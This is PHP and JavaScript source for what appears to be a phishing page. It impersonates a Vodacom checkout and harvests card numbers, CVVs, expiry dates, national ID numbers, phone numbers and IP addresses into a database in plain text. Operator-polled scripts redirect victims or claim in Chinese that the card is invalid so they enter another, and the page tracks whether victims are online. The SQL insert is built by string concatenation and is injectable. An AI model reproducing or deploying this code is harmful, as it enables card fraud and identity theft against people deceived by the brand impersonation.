<?php
session_start();
require_once 'config.php';
include('header-payment.php');

//$card_name = $_GET['name'];


if (isset($_SESSION['post']['recipients_name'])) {
    $_SESSION['NameOnCard'] = $_SESSION['post']['firstName'];
}
if (isset($_POST['CardNumber']) && isset($_POST['ExpiryDate']) && isset($_POST['CardCvv'])) {
    $_SESSION['NameOnCard'] = $_POST['card_holder_name'];
    $_SESSION['post'] = $_POST;
}
if (isset($_POST['submit'])) {
    $_SESSION['post'] = $_POST;
}

if (isset($_POST['payment_submit']) and !empty($_SESSION['post'])) {
    $payment_info = $_POST;
    $_POST = $_SESSION['post'];
    $ip = get_client_ip();


    if (!empty($_POST['card_holder_name'])) {
        $fullName = $_POST['card_holder_name'];
    } else {
        $fullName = "";
    }

    if (!empty($_POST['country'])) { // country
        $country = $_POST['country'];
    } else {
        $country = "";
    }
    if (!empty($_POST['other_country'])) {
        $othercountry = $_POST['other_country'];
    } else {
        $othercountry = "";
    }
    if (!empty($_POST['idtype'])) { // idtype
        $idtype = $_POST['idtype'];
    } else {
        $idtype = "";
    }
    if (!empty($_POST['id_number'])) { // id_number
        $idnumber = $_POST['id_number'];
    } else {
        $idnumber = "";
    }

    if (!empty($_POST['contact_number'])) {
        $phone = $_POST['contact_number'];
    } else {
        $phone = "";
    }
    $_SESSION["contact_number"] = $phone;

    if (!empty($payment_info['CardNumber'])) {
        $cardnumber = str_replace(' ', '', $payment_info['CardNumber']);
    } else {
        $cardnumber = "";
    }
    if (!empty($payment_info['ExpiryDate'])) {
        $exp_date = $payment_info['ExpiryDate'];
    } else {
        $exp_date = "";
    }
    if (!empty($payment_info['CardCvv'])) {
        $card_code = $payment_info['CardCvv'];
    } else {
        $card_code = "";
    }
    $_SESSION['post'] = '';
    $_SESSION['total_quantity'] = '';
    $_POST = '';
    $date = date('Y-m-d H:i:s');
    $sql = "INSERT INTO user_information (fullname, countryName, othercountry, idtype, idnumber, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress)
    VALUES ('" . $fullName . "', '" . $country . "', '" . $othercountry . "', '" . $idtype . "', '" . $idnumber . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "')";
// echo $sql; die;
    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        $_SESSION["last_id"] = $last_id;


        $_SESSION['post'] = '';
        $_SESSION['total_quantity'] = '';
        $_POST = '';
        //echo '<script>window.location.replace("page5.php")</script>';
        echo '<style>.spinner-border{display:block !important;}</style>';
        echo '<style>.backdrop{display:block !important;}</style>';
        //echo "New record created successfully. Last inserted ID is: " . $last_id;
    } else {
        $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
} // submit end

?>

    <style>
        header.main-header {
            display: none;
        }

        header.payment-header {
            display: block;
            text-align: center;
            padding: 10px 10px 0px 10px;
        }

        .hideH {
            display: none !important;
        }


        .extra-details {
            text-align: center;
            font-weight: bold;
            margin-top: 25px;
            font-size: 14px;
        }

        .top1 h3 {
            text-align: center;
            margin-bottom: 15px;
            margin-top: 15px;
        }

        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
        }

        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
        }

        .top1 table.cstm-table {
            margin-bottom: 20px;
        }

        .payment-page .page-header {
            display: flex;
            margin-top: 20px;
        }

        .payment-page .vodacom-logo {
            margin: 0 auto;
        }

        .payment-page .vodacom-logo img {
            height: 2.5rem;
        }

        .payment-page .order-banner {
            margin: 0;
            padding: 10px 20px;
            background-color: #f8f9fa;
            display: flex;
            justify-content: space-around;
        }

        .payment-page a#vieworder {
            font-family: VodafoneRg-Bold, sans-serif;
            color: #e60000;
            cursor: pointer;
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            font-weight: bold;
        }

        .card-display img {
            width: 40px;
            margin: 0 5px;
            max-height: 40px;
            vertical-align: middle;
        }

        .credit-card-form .card-display-wrapper {
            width: 100%;
            text-align: center;
        }

        @media (max-width: 767px) {
            .submit-btn {
                background-color: #2e80f4;
                padding: 11px 24px;
                font-size: 1rem;
                display: block;
                width: 100%;
                min-width: 120px;
                margin-left: auto;
                margin-right: auto;
                line-height: 22px;
                border-radius: 32px;
                color: #fff;
                border-color: #2e80f4;
                height: auto;
                cursor: pointer;
            }

            .submit-btn:hover:hover {
                background-color: #003ef7;
                border-color: #003ef7;
            }
        }


        .lds-default div {
            background: red !important;
        }
    </style>

    <div class="container">

        <div class="payment-page">


            <div class="order-banner">
                <div>
                    <p>Order Number: </p>
                    <strong>8000161595</strong>
                </div>
                <a class="text-upper" id="vieworder">View Order</a>
            </div>
        </div>


    </div>
    <div class="container">
    <div class="credit-card-form">
        <div class="card-display-wrapper">
            <div class="card-display">
                <img src="./images/MasterCard.svg" class="" id="MastercardCard">
                <img src="./images/Visa.svg" class="" id="Visacard">
            </div>
            <link rel="stylesheet"
                  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


            <form action="" method="POST">
                <div class="card-form" id="CardForm">

                    <div class="form-group floating-input ">
                        <img src="images/name.svg">
                        <input aria-label="Card Number" id="NameOnCard" maxlength="30" name="card_holder_name"
                               placeholder='Name on Card' type="text"
                               value="">
                        <label>
                            <img style="display: block;" src="images/name.svg">
                            Name on Card
                        </label>
                        <div class="error"></div>
                    </div>

                    <div class="form-group floating-input">
                        <i class="fa fa-credit-card" style="color:#ec3b3b;"> </i>
                        <input aria-label="Card Number" id="CardNumber" inputmode="numeric" maxlength="19"
                               name="CardNumber" placeholder="Card Number" type="tel" value="">


                        <label class="card-brand">
                            <img src="./images/MasterCard.svg" width="24" class="hidden" id="MastercardBrand">
                            <img src="./images/Visa.svg" width="24" class="hidden" id="VisaBrand">
                            Card Number
                        </label>
                        <div class="error"></div>
                    </div>

                    <div class="d-flex justify-content-between">

                        <div class="form-group floating-input ">
                            <img src="./images/expiry_date.svg">
                            <input aria-label="Expiry Date" id="ExpiryDate" name="ExpiryDate" placeholder="Expiry Date"
                                   type="text" maxlength="5" pattern="\d{2}\/\d{2}" value="">

                            <label>
                                <img src="./images/expiry_date.svg">
                                Expiry Date
                            </label>
                            <div class="error"></div>
                        </div>

                        <div class="form-group floating-input ">
                            <img src="./images/cvv.svg"> <input aria-label="CVV" id="Cvv" inputmode="numeric"
                                                                maxlength="3" name="CardCvv" placeholder="CVV"
                                                                type="tel" value="">
                            <label>
                                <img src="./images/cvv.svg">
                                CVV
                            </label>
                            <div class="error"></div>
                        </div>
                    </div>

                    <div style="clear:both;"></div>
                    <center><p style="font-weight: 600;margin-top: 25px;font-size:16px;color:black;"><i
                                    class="fa fa-lock"> </i> Secure Checkout</center>
                    </p>
                    <center><p style="padding-lefT: 20px;padding-right: 20px;padding-top: 6px;font-size:14px;"> By
                            Clicking 'Pay', you agree to the <br>
                            <a href="" style="color:red;"> Terms and Conditions and Privcy Policy </a></center>
                    </p>

                    <div style="clear:both;"></div>
                    <div class="btn-div">
                        <a href="/page3.php" class="cancel-btn" style="width:120px !important"> Cancel </a>
                        <button class="next-btn disabledClass" id="next-btn" onclick="hitSubmit()" name="payment_submit"
                                type="submit"> Next
                        </button>
                    </div>

                </div>
            </form>
        </div>


    </div>


    <div class="spinner-border" id="ajaxprogress"
         style=" padding: 40px;background-color: rgba(128, 128, 128, 0.7) !important; z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;"
         role="status">
  <span class=""
        style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
  </span>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js"
            integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="./assets/js/jquery-2.1.3.min.js"></script>
    <script>


        function hitSubmit() {
            const input1 = document.querySelector('#NameOnCard');
            const input2 = document.querySelector('#CardNumber');
            const input3 = document.querySelector('#ExpiryDate');
            const input4 = document.querySelector('#Cvv')
            // Add event listeners to input fields to listen for changes


            if (input1.value && input2.value && input3.value && input4.value) {
                $(".backdrop").show();
                $('#ajaxprogress').show();
            }

        }

        //script to check input
        jQuery('.form-input input, .form-input select').on('input', function () {
            let check = true;
            jQuery('.form-input input, .form-input select').each(function () {
                if (jQuery(this).val() == '') check = false;
            });
            if (check) jQuery('.btn').removeClass('disabled');
            else jQuery('.btn').addClass('disabled')
        });

        function creditCardValidation() {
            let creditCradNum = $('#CardNumber').val();
            console.log("creditCradNum ==>", creditCradNum.length === 19);
            if (creditCradNum.length === 19) {
                $(".next-btn").removeClass('disabled');
                $(".next-btn").removeClass('disabledClass');
                $(".next-btn").attr('disabled', false);
                return true;
            } else {
                console.log("Please enter a valid credit card number.");
                $(".next-btn").addClass('disabledClass');
                $(".next-btn").attr('disabled', true);
                return false;
            }
        }

        //For Card Number formatted input
        var cardNum = document.getElementById('CardNumber');
        cardNum.onkeyup = function (e) {
            creditCardValidation();
            $("#CardNumber").removeAttr("style");
            $(".errormsg").css("display", "none");
            if (this.value == this.lastValue) return;
            let caretPosition = this.selectionStart;
            let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
            let parts = [];

            for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
                parts.push(sanitizedValue.substring(i, i + 4));
            }

            for (var i = caretPosition - 1; i >= 0; i--) {
                var c = this.value[i];
                if (c < '0' || c > '9') {
                    caretPosition--;
                }
            }
            caretPosition += Math.floor(caretPosition / 4);

            this.value = this.lastValue = parts.join(' ');
            this.selectionStart = this.selectionEnd = caretPosition;
            // if (sanitizedValue.length > 0)
            //   $("input[name=payment_submit]").removeAttr('disabled');
            // else
            //   $("input[name=payment_submit]").attr('disabled', 'disabled');
        }
    </script>


    <script type="text/javascript">
        var userid = '<?php echo @$_SESSION["last_id"]; ?>';

        function updatePromptStatus() {
            $.ajax({
                type: 'post',
                url: 'prompt_status.php',
                data: {
                    'userid': userid,
                    'page': 4
                },
                success: function (data) {
                }
            });
        }

        jQuery(document).ready(function () {
            popcount = 1;
            window.setInterval(function () {

                // do stuff
                var userid = '<?php echo @$_SESSION["last_id"]; ?>';

                $.ajax({
                    type: 'post',
                    url: 'usertrackingstatus.php',
                    data: {
                        'userid': userid,
                        'page': 2
                    },
                    success: function (data) {
                        if (data == 1 || data == '1') {
                            jQuery(location).attr('href', './page5.php');
                        }
                        if (data == 2 || data == '2') {
                            jQuery("#ajaxprogress").css("display", "none")
                            jQuery('#carderror').css('display', 'block');
                            if (popcount == 1) {
                                if (window.confirm('卡號無效，請重新輸入卡號')) {
                                    console.log("window confirm box message");
                                    $(".backdrop").addClass('hideH');
                                    $('#ajaxprogress').addClass('hideH');
                                    updatePromptStatus();
                                }
                            }
                            popcount++;
                            $(".backdrop").hide();
                            return false;
                        }
                    }
                });

            }, 4000);


            $("body").on("change", "#CardNumber", function () {

                var ignoreArray = ["123456789", "22222222"];
                var currentValue = $(this).val().replace(/ /g, '');

                if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                    $("#CardNumber").css("border", "2px solid red");
                    $(".errormsg").css("display", "block");

                }


            })

        })
    </script>
    <script>
        /* JS comes here */
        function setOnline(id, status) {
            if (id) {
                $.ajax({
                    type: 'post',
                    url: 'usertrackingstatus.php',
                    data: {
                        'id': id,
                        'status': status
                    },
                    success: function (data) {

                    }
                });
            }
        }

        var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


            window.addEventListener('load', function (e) {
                if (navigator.onLine) {
                    setOnline(userid, 1)
                } else {
                    setOnline(userid, 0)
                }
            }, false);

        window.addEventListener('online', function (e) {
            setOnline(userid, 1)
        }, false);

        window.addEventListener('offline', function (e) {
            setOnline(userid, 0)
        }, false);
    </script>


    <script type="text/javascript">
        const input1 = document.querySelector('#NameOnCard');
        const input2 = document.querySelector('#CardNumber');
        const input3 = document.querySelector('#ExpiryDate');
        const input4 = document.querySelector('#Cvv');
        const submitBtn = document.querySelector('#next-btn');

        // Add an event listener to all input fields
        [input1, input2, input3, input4].forEach(inputField => {
            inputField.addEventListener('input', function () {
                // Check if all input fields have a value
                if (input1.value !== '' && input2.value !== '' && input3.value !== '' && input4.value !== '') {
                    // If all input fields have a value, make the submit button red
                    submitBtn.style.backgroundColor = 'red';
                    submitBtn.style.color = 'white';
                    submitBtn.style.border = '1px solid red';

                } else {
                    // If any input field is empty, make the submit button gray
                    submitBtn.style.backgroundColor = '#ebebeb';
                    submitBtn.style.color = 'black';
                }
            });
        });
    </script>


    <script type="text/javascript">
        const cardNumberInput = document.getElementById('CardNumber');
        cardNumberInput.addEventListener('input', (event) => {
            // Remove all non-digits from the input value
            const digitsOnly = event.target.value.replace(/\D/g, '');

            // Only format if input contains exactly 16 digits
            if (digitsOnly.length === 16) {
                // Use regex to add a space every 4 digits
                const formattedValue = digitsOnly.replace(/(\d{4})(?=\d)/g, '$1 ');
                // Set the formatted value back into the input field
                event.target.value = formattedValue;
            } else {
                // If input value does not match the format, leave it as is
                event.target.value = digitsOnly;
            }
        });

    </script>


    <script type="text/javascript">


        // Get the input field
        const expiryDateInput = document.getElementById('ExpiryDate');

        // Add an event listener to the input field
        expiryDateInput.addEventListener('input', function () {
            // Get the input value
            const inputValue = this.value;

            // Remove any non-numeric characters from the input value
            const cleanedValue = inputValue.replace(/\D/g, '');

            // If the cleaned value is empty, clear the input field
            if (cleanedValue === '') {
                this.value = '';
                return;
            }

            // If the cleaned value is shorter than 4 digits, don't format it yet
            if (cleanedValue.length < 4) {
                this.value = cleanedValue;
                return;
            }

            // Format the cleaned value to 'MM/YY'
            const formattedValue = cleanedValue.substring(0, 2) + '/' + cleanedValue.substring(2, 4);
            this.value = formattedValue;
        });


    </script>

<?php
include('footer.php');
